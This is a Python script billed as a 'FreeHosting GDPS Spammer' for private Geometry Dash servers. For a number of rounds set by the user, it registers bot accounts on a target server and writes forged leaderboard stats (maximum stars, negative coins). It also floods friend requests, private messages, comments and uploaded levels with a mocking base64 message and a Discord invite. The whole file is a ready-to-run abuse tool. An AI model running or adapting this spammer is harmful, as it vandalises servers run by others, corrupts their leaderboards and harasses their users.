
# - Дискорд
import requests
import random
from random import randint as rand
import colorama
from colorama import Fore, Back, Style
import time
import os
colorama.init()
# ~~~~~~~~
reset = Style.RESET_ALL
red = Fore.RED
green = Fore.GREEN
yellow = Fore.YELLOW
cyan = Fore.CYAN


def data():
	global name
	global passw
	global email
	global stars
	name = str(random.randint(111111111111111111111111111111, 999999999999999999999999999999)) + " RGDS Botting"
	passw = "gdpsrn228228"
	email = str(random.randint(1111,9999)) + "@rgds.xyz"
	stars = 2147483647
	print(yellow+Style.BRIGHT+"\n"+"UserName: "+name+reset)


def acc_reg():
	reg_data = {
		"userName": name,
		"password": passw,
		"email": email,
		'secret': 'Wmfd2893gb7',
	}
	headers = {'User-Agent': ''}
	r_reg = requests.post(url+"accounts/registerGJAccount.php", data=reg_data, headers=headers)
	return r_reg.text

def acc_login():
	global r_log
	log_data = {
		"userName": name,
		"password": passw,
		'secret': 'Wmfd2893gb7'
	}
	headers = {'User-Agent': ''}
	r_log = requests.post(url+"accounts/loginGJAccount.php", data=log_data, headers=headers)
	return r_log.text

def acc_update_stats():
	g = r_log.text
	id = g.split(",")
	icon = str(rand(2,17))
	stats_data = {
		'gameVersion': 21,
		'binaryVersion': 35,
		"gdw": 0,
		"userName": name,
		"accountID": id[0],
		'secret': "Wmfd2893gb7",
		"gjp": "VFNFQURdBQcKBAEP",
		"stars": stars,
		"demons": -99,
		'diamonds': -11,
		'coins': -11,
		'userCoins': -99,
		'special': 0,
		'gameVersion': 21,
		"secret": "Wmfv3899gc9",
		"icon": icon,
		'iconType': 0,
		'accIcon': icon,
		'accShip': icon ,
		'accBall': icon,
		'accBird': icon,
		'accDart': icon,
		'accRobot': icon,
		'accGlow': 1,
		'accSpider': icon,
		'accExplosion': 1,
		"color1": icon,
		"color2": icon
	}
	headers = {'User-Agent': ''}
	r_stats = requests.post(url+"updateGJUserScore.php", data=stats_data, headers=headers)
	return r_stats.text

def acc_com():
	g = r_log.text
	id = g.split(",")
	comm_data = {
	"gameVersion": 21,
	"binaryVersion": 35,
	"gdw": 0,
	"accountID": id[0],
	"gjp": "VFNFQURdBQcKBAEP",
	"userName": name,
	"secret": "Wmfv3899gc9",
	"comment": base64
	}
	headers = {'User-Agent': ''}
	r_comm = requests.post(url+"uploadGJAccComment20.php", data=comm_data, headers=headers)
	return r_comm.text

def acc_friends():
	g = r_log.text
	id = g.split(",")
	to = str(random.randint(1, int(id[0])))
	friend_data = {
	"gameVersion": 21,
	"binaryVersion": 35,
	"accountID": id[0],
	"toAccountID": to,
	"comment": base64,
	'gdw': 0,
	"gjp": "VFNFQURdBQcKBAEP",
	"userName": name,
	"secret": "Wmfv3899gc9",
	}
	headers = {'User-Agent': ''}
	r_acc_friend = requests.post(url+"uploadFriendRequest20.php", data=friend_data, headers=headers)
	return r_acc_friend.text

def acc_message():
	g = r_log.text
	id = g.split(",")
	to = str(random.randint(1, int(id[0])))
	mess_data = {
	"gameVersion": 21,
	"binaryVersion": 35,
	"secret": "Wmfv3899gc9",
	"subject": "UkdEUyBCb3R0aW5n",
	"body": base64,
	"toAccountID": to,
	"accountID": id[0],
	"gjp": "VFNFQURdBQcKBAEP",
	"gdw": 0,
	"secret": "Wmfv3899gc9",
	}
	headers = {'User-Agent': ''}
	r_mess = requests.post(url+"uploadGJMessage20.php", data=mess_data, headers=headers)
	return r_mess.text

def lvl_upload():
	global r_lvl
	g = r_log.text
	song = random.randint(1,886061)
	id = g.split(",")
	lvl_data = {
	"gameVersion": 21,
	"binaryVersion": 35,
	"userName": name,
	'gdw': 0,
	'levelVersion': 1,
	'levelLength': 99,
	'audioTrack': 0,
	"auto": 0,
	"password": 123456,
	"original": 0,
	"twoPlayer": 0,
	"songID": song,	
	"objects": 11,
	'coins': 10,
	'requestedStars': 8,
	'unlisted': 0,
	"wt": 11,
	"wt2": 0,
	"ldm": 0,
	'extraString': "0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0",
	"gjp": "VFNFQURdBQcKBAEP",
	"secret": "Wmfv3899gc9",
	"levelName": name,
	"levelInfo": "rgds",
	'levelDesc': base64,
	"accountID": id[0],	
	"levelString": "H4sIAAAAAAAAC6VYy5LlJgz9ITeFBOJRqVn0PpNU0tkkG1dPZiqL-YBs8vEjXgYMvvh2Fn3dSDqSEHpgf39TboNd7sh_iv8AdiTaAdNDxYfeX2A3O0gpd7vDDhR-HIu7Hf5LcJC4J-mFCvj_KvxURZBJgFtKcA_4mSLAqmgZEbpUI5_xxjxWg3fU0IOwgLHL3eAEv31_BbXJ8KD0MOmhN_5N_9tEyQ8XHm_KxxXG36QgMl71hvybuCDTAzb5E2wcBcvMF_Sb2sDQpswGGzFji4KKopiXUKWqEG4YDGDQzOJKeCSPmwpIR8wmTvQAh-ABeiEtBQ2slYJZDHZQb6yWnRbGbQq2P_799OnAvJAwRFIFlHyE-rtFKRKgaY35p8EgCG2WkC-tGSsIOaeXoD-7HSEJuuHcX68tCDgOjiO-Qr3_1qC0E6ietGSMUHoNaXdERni_hPzcBptIaFynQndAWgkDS8jXNgAeSsY9dq07VC-8urGfLgQOhJHr_fzeRtqjUKD9EpSPFDQXWhRVIYA2FlYoQfDRsD8UgzPCrv1vYwtWCwvrSH3rQN4L_WSggJMl5-TDTXc5yX1JoF6Dfu28MxxfeaMJdO4pI9x6S2-dIS4zdyPLfukMcTbDjS11FcDNWvDoWDeBHsRxuGOpc4_7DeES0zU24P6eOuhDzJfeDgi7bu6fezvc3ded-mvKIGNkHFMlAGGwMtkFYgql3wzPt1BMjo-eybExccSiWh1_GPQu34H_RkGVBKNp8h1AZoCxh7iyuWzTkq1jnMK6GURarGdK7nNRcz5ebWNb4O2AO6yqVNWoSstIVDulwgM9-oSAqkZSs4kH0km9obLWI7qRG-m6wVui1oGGNNOaWTPFHcpco3oWhoGUuouPxuWZENam8S6s_UW4MgNVL9ibTElHKWnVjawLmihn2TmWRPMYk5vQe8vrwshKio81da8c7WGPDIQbivZjcAIdRrqL9LKlXOcx5CYeOPL_XZqbmFAI6jAW164cYeL38YxAK8_6oFLd2VerrtSoat_F60i88yQHkkQh9EUatcZ841Qua5_XU-sTuhzpruoBOqy5Kn2mqinVnKnVv3LgjR-TOql0OyePu0lazmSH4yaDB5kB3pSexW85lUp5Jxl-2okrl9mypvnOnBvprtKH3M16Zo0gsRTkhHuu1AqYWvCs4Ci-HmZxokopqVaKqhPk_enwhhjDmDm6ADLnmLpKySMC7FHJ84PQjahMlT6qaIaLvxgamX6cTFoPOZTIQw5l9PlY_GmS-bQ54zsYr8djyywO8weOLdvRsDq2k_zHjMFdY_Flxnajz9Np7eo6HmQi1EYLMjUOSyfCcCaFkTOjLWNf2cjbbCu0kGNz7ASNOUR8nyuFMIyawhjGambMnD566JTBt8ETgSY1X3juycl64Naz-xC1scI-aubATk1ZqZsDqLOtKPD2dHZlIBwEM6_2rHIo70yfAcy08LPJq-Sb0OV02mT6KA944RBc3MwyY9xaol9ZmNDd3NNE7-StjqcC6VKk0m1-I7292AgjrysSlQ3Q8Gaz4clYOrlOPLxmYJgELB656ftGZmL_iQMvujvgxTsE1O8FU0Z4-5oz6EgytJNCrN7MKzTbNc9WKHYvIA8rNIv6j1Rowa4qtO5_EkKlTi0rE8ZIKXPRJ5W_OAU16X7pHb4ok8fN18vyOt9AZ_6a6_NS9bNd1Il2PVZ5vzaDGsDtM1DH96-75tL379HHpcl09yqR09SQbHXCj6I43uBYtkBOV7jCT_EHOpP8TNnxonm-DwZu_jg8Dl59cbEujLER6KtGqy_6qbb23B_TcEoAmn0dySDVfe8oput4S4QqlWOhj8-UMQY_ABzlpH8gHAAA"
	}
	headers = {'User-Agent': ''}
	r_lvl = requests.post(url+"uploadGJLevel21.php", data=lvl_data, headers=headers)
	return r_lvl.text

def lvl_com():
	g = r_log.text
	id = g.split(",")
	# ---
	gg = r_lvl.text
	com_data = {
	"gameVersion": 21,
	"binaryVersion": 35,
	"gdw": 0,
	"accountID": id[0],
	"gjp": "VFNFQURdBQcKBAEP",
	"userName": name,
	"secret": "Wmfv3899gc9",
	"comment": base64,
	"levelID": gg,
	}
	headers = {'User-Agent': ''}
	r_com = requests.post(url+"uploadGJComment21.php", data=com_data, headers=headers)
	return r_com.text


print(cyan+Style.BRIGHT+"\n                               <-------> FreeHosting GDPS Spammer By Rienn0 <------->\n"+reset)
print(cyan+"<------> My Discord:"+green+" https://goo.su/FhS"+cyan+" or "+green+"https://discord.gg/vRmpbKNBFW"+cyan+" <------>")
print("<------> Type "+green+"'list'"+cyan+" for get list FH urls <------>"+Style.BRIGHT)

base64 = "VXIgVHJhc2ggR0RQUyB3YXMgc3BhbW1lZCBieSBSR0RTCk91ciBEaXNjb3JkOiBkaXNjb3JkLmdnL2ozdEo3c3pmZ3U="
url = input("\n<~~~~~~~~> [34 symbols only] Database (with '/'): ")
leaderboards = url + "tools/stats/top24h.php"
limit = int(input("\n<~~~~~~~~> Spam amount: "))
start = 0
start_time = time.time()

while True:
	if len(url) == 34:
		print(reset+cyan+"\n"+str(start)+") Spamming: "+url)
		print(reset+cyan+f"Leaderboards: {leaderboards}")
		data()
		print(f"Регистрация Аккаунта: {acc_reg()}")
		print(f"Вход в аккаунт: {acc_login()}")
		print(f"Обновление статистики: {acc_update_stats()}")
		print(f"Пост в профиле: {acc_com()}")
		print(f"Запрос в друзья: {acc_friends()}")
		print(f"Отправка сообщения: {acc_message()}")
		print(f"Публикация уровня: {lvl_upload()}")
		print(f"Комментарий к уровню: {lvl_com()}")
		lvl_com()
	else:
		print(red+"\n<~~ERROR~~> The database must consist of 34 characters"+cyan)
		os.system("python main.py")

	start += 1
	if start == limit:
		hist = open("history.txt", "a")
		hist.write("\n-----------------------------\n"+url+"\n-----------------------------\n\n")
		print(cyan+"\n<~~~~~~~~> Done! Spam amount: "+ str(start))
		print("<~~~~~~~~> Time Spent: %s seconds" % (time.time() - start_time))
		os.system("python main.py")